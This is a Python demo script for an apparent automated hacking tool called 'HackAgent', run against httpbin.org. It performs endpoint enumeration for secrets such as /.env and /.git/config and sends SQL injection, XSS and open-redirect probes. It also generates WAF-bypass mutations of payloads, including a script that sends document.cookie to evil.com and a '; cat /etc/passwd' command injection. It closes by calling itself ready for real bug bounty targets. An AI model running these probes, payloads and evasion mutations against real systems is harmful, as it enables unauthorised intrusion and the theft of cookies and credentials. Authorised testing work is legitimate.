#!/usr/bin/env python3
"""
HackAgent Live Demo - Against Legal Practice Targets

Using intentionally vulnerable applications:
- OWASP Juice Shop (if local)
- httpbin.org (for request testing)
- Demo vulnerable endpoints
"""

import asyncio
import sys
sys.path.insert(0, '.\\skills\\hackagent')

from core.hacker_mind import HackerMind, AttackPhase
from core.exploit_db import ExploitDB, seed_default_exploits
from tools.http_client import HackerHTTPClient
from tools.payload_mutator import PayloadMutator


async def demonstrate_recon(target: str):
    """Phase 1: Reconnaissance"""
    print("\n" + "=" * 70)
    print("PHASE 1: RECONNAISSANCE")
    print("=" * 70)
    
    mind = HackerMind(
        target=target,
        scope={"in_scope": [target], "out_of_scope": []}
    )
    
    async with HackerHTTPClient(requests_per_second=2.0) as client:
        # 1. Fingerprint the target
        print("\n[*] Fingerprinting target...")
        result = await client.get(target)
        
        if result.error:
            print(f"[!] Error: {result.error}")
            return None
        
        print(f"[+] Status: {result.status}")
        print(f"[+] Response time: {result.elapsed_ms:.0f}ms")
        
        # Analyze headers
        print("\n[*] Analyzing headers...")
        interesting_headers = ['Server', 'X-Powered-By', 'X-Frame-Options', 
                               'Content-Security-Policy', 'X-XSS-Protection']
        
        for header in interesting_headers:
            if header in result.headers:
                value = result.headers[header]
                mind.observe("technology", value, header)
                print(f"    {header}: {value}")
        
        # WAF Detection
        if result.waf_detected:
            print(f"\n[!] WAF DETECTED: {result.waf_detected}")
            mind.observe("defense", f"WAF: {result.waf_detected}", "headers")
        
        # 2. Common endpoint enumeration
        print("\n[*] Enumerating endpoints...")
        common_paths = [
            '/robots.txt', '/sitemap.xml', '/.git/config', '/.env',
            '/admin', '/api', '/api/v1', '/swagger', '/graphql',
            '/login', '/register', '/user', '/debug', '/test',
            '/backup', '/config', '/.htaccess', '/server-status',
        ]
        
        found_endpoints = []
        for path in common_paths:
            url = target.rstrip('/') + path
            r = await client.get(url)
            
            if r.status == 200:
                print(f"    [FOUND] {path} (200 OK)")
                found_endpoints.append(path)
                mind.observe("endpoint", path, "enumeration")
            elif r.status == 403:
                print(f"    [FORBIDDEN] {path} (403 - exists but blocked)")
                mind.observe("endpoint", f"{path} (forbidden)", "enumeration")
            elif r.status == 301 or r.status == 302:
                print(f"    [REDIRECT] {path} ({r.status})")
        
        print(f"\n[+] Found {len(found_endpoints)} accessible endpoints")
        print(f"[+] Client stats: {client.get_stats()}")
        
        return mind


async def demonstrate_vulnerability_testing(target: str, mind: HackerMind):
    """Phase 2: Vulnerability Testing"""
    print("\n" + "=" * 70)
    print("PHASE 2: VULNERABILITY TESTING")
    print("=" * 70)
    
    mutator = PayloadMutator()
    db = ExploitDB()
    
    # Ensure DB is seeded
    if not db.exploits:
        seed_default_exploits(db)
    
    async with HackerHTTPClient(requests_per_second=2.0) as client:
        
        # Test 1: SQL Injection
        print("\n[*] Testing for SQL Injection...")
        
        sqli_payloads = ["'", "' OR '1'='1", "1' AND '1'='1", "' OR 1=1--"]
        
        for payload in sqli_payloads:
            # Test in common parameter
            test_url = f"{target}?id={payload}"
            r = await client.get(test_url)
            
            # Check for SQL error indicators
            sql_errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'syntax error', 'ORA-']
            
            if any(err in r.body.lower() for err in sql_errors):
                print(f"    [VULN!] SQL error with payload: {payload}")
                print(f"           Possible SQLi at {target}?id=")
                
                # Generate bypass payloads if WAF detected
                if mind.waf_detected:
                    print(f"    [*] WAF detected, generating bypass payloads...")
                    bypasses = mutator.smart_mutate(payload, mind.waf_detected)
                    for b in bypasses[:3]:
                        print(f"        → {b.mutated}")
            else:
                print(f"    [-] No SQL error with: {payload[:20]}...")
        
        # Test 2: XSS
        print("\n[*] Testing for XSS...")
        
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><script>alert(1)</script>",
        ]
        
        for payload in xss_payloads:
            test_url = f"{target}?q={payload}"
            r = await client.get(test_url)
            
            # Check if payload is reflected
            if payload in r.body:
                print(f"    [VULN!] XSS - Payload reflected: {payload[:30]}...")
            elif payload.replace('<', '&lt;') not in r.body:
                # Might be filtered but check mutations
                mutations = mutator.mutate_all(payload)
                for m in mutations[:2]:
                    test_url = f"{target}?q={m.mutated}"
                    r2 = await client.get(test_url)
                    if m.mutated in r2.body or payload in r2.body:
                        print(f"    [VULN!] XSS via {m.mutation_type.value}: {m.mutated[:30]}...")
                        break
        
        # Test 3: Open Redirect
        print("\n[*] Testing for Open Redirect...")
        
        redirect_payloads = [
            "//evil.com",
            "https://evil.com",
            "//evil.com/%2f..",
            "////evil.com",
        ]
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'returnUrl', 'goto']
        
        for param in redirect_params:
            for payload in redirect_payloads[:2]:
                test_url = f"{target}?{param}={payload}"
                r = await client.get(test_url, allow_redirects=False)
                
                if r.status in [301, 302, 303, 307, 308]:
                    location = r.headers.get('Location', '')
                    if 'evil.com' in location:
                        print(f"    [VULN!] Open Redirect: {param}={payload}")
                        print(f"           Redirects to: {location}")
        
        # Test 4: Information Disclosure
        print("\n[*] Testing for Information Disclosure...")
        
        sensitive_paths = [
            '/.git/HEAD',
            '/.svn/entries', 
            '/backup.sql',
            '/database.sql',
            '/phpinfo.php',
            '/info.php',
            '/server-info',
            '/elmah.axd',
            '/trace.axd',
        ]
        
        for path in sensitive_paths:
            url = target.rstrip('/') + path
            r = await client.get(url)
            
            if r.status == 200:
                # Check for sensitive content
                if 'ref:' in r.body:  # Git
                    print(f"    [VULN!] Git repository exposed: {path}")
                elif 'phpinfo' in r.body.lower():
                    print(f"    [VULN!] PHP info exposed: {path}")
                elif 'CREATE TABLE' in r.body or 'INSERT INTO' in r.body:
                    print(f"    [VULN!] Database dump exposed: {path}")


async def demonstrate_exploit_lookup():
    """Phase 3: Exploit Database Lookup"""
    print("\n" + "=" * 70)
    print("PHASE 3: EXPLOIT DATABASE")
    print("=" * 70)
    
    db = ExploitDB()
    if not db.exploits:
        seed_default_exploits(db)
    
    print(f"\n[*] Loaded {len(db.exploits)} exploits")
    
    # Show relevant exploits
    print("\n[*] High-value exploits in database:")
    
    for exploit in db.list_all():
        if exploit.severity in ['critical', 'high']:
            print(f"\n    [{exploit.severity.upper()}] {exploit.name}")
            print(f"    Type: {exploit.exploit_type}")
            print(f"    Bounty: {exploit.bounty_range}")
            if exploit.payloads:
                print(f"    Sample payload: {exploit.payloads[0][:50]}...")


async def demonstrate_payload_mutations():
    """Phase 4: WAF Bypass Techniques"""
    print("\n" + "=" * 70)
    print("PHASE 4: WAF BYPASS MUTATIONS")
    print("=" * 70)
    
    mutator = PayloadMutator()
    
    payloads = {
        "SQL Injection": "' UNION SELECT * FROM users--",
        "XSS": "<script>document.location='http://evil.com/'+document.cookie</script>",
        "Command Injection": "; cat /etc/passwd",
    }
    
    for name, payload in payloads.items():
        print(f"\n[*] {name} mutations:")
        print(f"    Original: {payload[:50]}...")
        print(f"    Mutations:")
        
        for m in mutator.mutate_all(payload)[:5]:
            print(f"      [{m.mutation_type.value}] {m.mutated[:60]}...")


async def main():
    print("=" * 70)
    print("HACKAGENT LIVE DEMONSTRATION")
    print("=" * 70)
    print("\nTarget: httpbin.org (legal testing endpoint)")
    print("Purpose: Demonstrate HackAgent capabilities")
    print("-" * 70)
    
    target = "https://httpbin.org"
    
    # Phase 1: Recon
    mind = await demonstrate_recon(target)
    
    if mind:
        # Phase 2: Vuln testing (limited on httpbin)
        await demonstrate_vulnerability_testing(target, mind)
    
    # Phase 3: Exploit DB
    await demonstrate_exploit_lookup()
    
    # Phase 4: Payload mutations
    await demonstrate_payload_mutations()
    
    print("\n" + "=" * 70)
    print("DEMONSTRATION COMPLETE")
    print("=" * 70)
    print("\nHackAgent capabilities demonstrated:")
    print("  ✓ Automated reconnaissance")
    print("  ✓ Technology fingerprinting")
    print("  ✓ WAF detection")
    print("  ✓ Endpoint enumeration")
    print("  ✓ SQL injection testing")
    print("  ✓ XSS detection")
    print("  ✓ Payload mutation for WAF bypass")
    print("  ✓ Exploit database lookup")
    print("\nReady for real bug bounty targets! 🎯")


if __name__ == "__main__":
    asyncio.run(main())
